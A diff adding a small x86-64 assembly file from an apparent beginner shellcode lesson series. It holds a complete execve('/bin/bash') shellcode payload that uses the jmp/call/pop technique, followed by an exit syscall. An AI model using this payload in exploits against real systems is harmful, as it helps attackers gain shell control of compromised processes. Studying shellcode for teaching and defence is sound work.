@@ -1,0 +1,36 @@
+;
+; part of my shellcode for noobs lesson series hosted in #goatzzz on irc.enigmagroup.org
+;
+; ----------------------------------------------------------------------------
+; "THE BEER-WARE LICENSE" (Revision 43):
+; <aaronryool@gmail.com> wrote this file. As long as you retain this notice you
+; can do whatever you want with this stuff. If we meet some day, and you think
+; this stuff is worth it, you can buy me a beer in return Aaron R. Yool
+; ----------------------------------------------------------------------------
+; 64bit call: rax args: rdi, rsi, rdx, r10,  r8, and r9
+
+[bits 64]
+section .text
+global _start
+_start:
+; execve("/bin/bash",$rsp,0)
+	xor rax,rax
+	mov al,0x3b
+	jmp short sh
+load_sh:
+	pop r10
+	xor rdx,rdx
+	push rdx
+	push r10
+	mov	rsi,rsp
+	mov	rdi,r10
+	syscall
+; exit(0);
+	xor rax,rax
+	mov al,0x3c
+	xor rdi,rdi
+	syscall
+
+sh:
+	call load_sh
+	db "/bin/bash"
